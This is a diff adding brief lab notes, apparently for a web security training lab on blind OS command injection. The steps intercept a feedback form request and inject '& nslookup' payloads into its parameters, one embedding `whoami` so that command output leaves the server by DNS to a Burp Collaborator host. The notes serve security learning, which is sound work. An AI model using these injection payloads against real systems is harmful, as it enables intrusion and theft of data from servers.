@@ -1,0 +1,11 @@
+Lab #5: Blind OS command injection with out-of-band data exfiltration   
+
+      Target Goal: 
+           Exploit Blind command injection to issue a DNS lookup to Burp Collaborator  
+
+      Analysis: 
+
+          >> fill the feedback form and intersept the request in burp
+          >> There are three different variables  
+          >> add encoded '& nslookup 'link of our burpsuite Collaborator' # ' to any of the variables
+          >> again modify the command like this  '& nslookup `whoami` 'link of our burpsuite Collaborator' # '
